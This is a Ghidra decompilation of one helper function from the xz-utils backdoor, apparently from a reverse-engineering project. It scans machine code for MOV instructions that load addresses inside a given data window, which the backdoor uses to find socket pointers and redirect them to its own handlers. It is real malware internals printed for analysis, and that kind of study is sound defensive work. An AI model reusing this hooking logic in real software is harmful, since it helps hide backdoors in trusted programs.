// /home/kali/xzre-ghidra/xzregh/102C60_find_addr_referenced_in_mov_instruction.c
// Function: find_addr_referenced_in_mov_instruction @ 0x102C60
// Calling convention: __stdcall
// Prototype: void * __stdcall find_addr_referenced_in_mov_instruction(StringXrefId id, string_references_t * refs, void * mem_range_start, void * mem_range_end)


/*
 * AutoDoc: Scans a referenced function for MOV instructions that materialise an address inside the supplied data window. The backdoor uses it to recover struct-field pointers (for example the monitor sockets) so it can redirect them to its own handlers.
 */
#include "xzre_types.h"


void * find_addr_referenced_in_mov_instruction
                 (StringXrefId id,string_references_t *refs,void *mem_range_start,
                 void *mem_range_end)

{
  u8 *code_end;
  BOOL BVar1;
  u8 *puVar2;
  long lVar3;
  dasm_ctx_t *pdVar4;
  u8 *code_start;
  dasm_ctx_t local_80;
  
  pdVar4 = &local_80;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)&pdVar4->instruction = 0;
    pdVar4 = (dasm_ctx_t *)((long)&pdVar4->instruction + 4);
  }
  code_start = (u8 *)refs->entries[id].func_start;
  if (code_start != (u8 *)0x0) {
    code_end = (u8 *)refs->entries[id].func_end;
    while (code_start < code_end) {
      BVar1 = find_instruction_with_mem_operand_ex(code_start,code_end,&local_80,0x10b,(void *)0x0);
      if (BVar1 == FALSE) {
        code_start = code_start + 1;
      }
      else {
        if (((byte)local_80.prefix.decoded.rex & 0x48) != 0x48) {
          if ((local_80.prefix.decoded.flags2 & 1) == 0) {
            if (mem_range_start == (void *)0x0) {
              return (u8 *)0x0;
            }
          }
          else {
            puVar2 = (u8 *)local_80.mem_disp;
            if (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
              puVar2 = (u8 *)(local_80.mem_disp + (long)local_80.instruction) +
                       local_80.instruction_size;
            }
            if ((mem_range_start <= puVar2) && (puVar2 <= (u8 *)((long)mem_range_end + -4))) {
              return puVar2;
            }
          }
        }
        code_start = code_start + local_80.instruction_size;
      }
    }
  }
  return (u8 *)0x0;
}

